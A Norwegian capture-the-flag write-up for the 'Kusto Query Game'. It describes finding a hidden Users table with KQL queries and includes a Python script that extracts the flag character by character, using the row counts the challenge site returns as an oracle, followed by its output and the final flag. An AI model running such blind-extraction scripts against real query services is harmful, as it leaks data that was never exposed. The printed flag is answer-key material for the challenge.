## THE KUSTO QUERY GAME

### Løsning

Løser The Kusto Query game med følgende query:

```sql
StormEvents
  | where EventId in 61032, 60904, 60913, 64588
```

Der EventIdene er EventIder fra StormEvents hentet fra [dataexplorer.azure.com](https://dataexplorer.azure.com/clusters/help/databases/Samples). Vi bruker et [pythonscript](win_game.py) for å generere querys som returnerer forskjellig antall rader. Datasettet med ider finnes [her](event_ids.txt).

Vinner vi spillet får vi beskjed om at løsningen ligger et sted i databasen og at vi må lekke flagget fra databasen:

![alt text](image.png)

Derfor finner frem templaten for hvordan StormEvents-databasen ser ut: [dataexplorer.azure.com](https://dataexplorer.azure.com/clusters/help/databases/Samples). Denne tjenesten kan også brukes for å teste KQL Queries før vi kjører den på nettsiden.

Du kan søke etter strings i alle kolonner i en tabell slik:

```sql
StormEvents | where * contains "a"
```

Da får vi vite hvor mange rader som inneholder `a`. Dette kan vi bruke for å søke etter flagget:

```sql
StormEvents | where * contains "ept{"
```

Dette ga ingen resultater, derfor sjekker vi om vi evt. har andre tabeller å søke i:

```sql
.show tables
```

Spørringen over avslører at det er `2` tabeller i databasen. Derfor prøver vi å finne navnet ved å teste typiske navn:

* Flag
* Flags
* Users
* Roles
* Groups

Vi får treff på tabellen `Users`. Senere fant vi også ut at tabellnavn kan byttes ut med `search *` for å søke i alle tabeller. Men siden vi allerede har funnet tabellen bruker vi bare navnet på denne for å gjøre søkene raskere. Nå kan vi søke etter flagget i tabellen Users:

```sql
Users | where * contains "ept{"
```

Her får vi 28 treff. Derfor mistenker vi at det er lagt inn "fake" flags. vi begrensen søket ved å legge til `"}"` i søket:

```sql
Users | where * contains "ept{" and * contains "}"
```

Nå får vi bare ett treff, så vi kan trygt si at dette er det ekte flagget. Herifra ble det å gjette en og en bokstav i flagget helt til vi finner `"}"`:

```py
import requests
import string
import re

def brute(url, query, word):
    for i in range(50):
        for letter in string.digits + string.ascii_lowercase + "_-?!}" + string.ascii_uppercase:
            # Use replace placaolder with payload
            query_to_run = query.replace("$$", word+letter)

            response = requests.post(url, { "query": query_to_run})
            if response.status_code == 200:
                # Regex match to see if there was a result
                if re.search(r'<h2>The row count for your query was \d+', response.text):
                    word += letter
                    print(word)
                    if(letter == "}"): return word
                    break
            else:
                print("error at", word)

brute("https://kqlgame.ept.gg/game", 'Users | where * contains "$$" and * contains "}"', "ept{")
```

```bash
[Running] python3 brute.py
ept{z
ept{z2
ept{z26
ept{z264
ept{z2641
...

[Done] exited with code=0 in 38.598 seconds
```

Vi fant også ut at KQL godtar regex. Derfor skal det også være mulig å kjøre søket etter bokstavene med betydelig færre requests.

<details>
<summary>Flagg</summary>

`ept{z2641a3a}`
</details>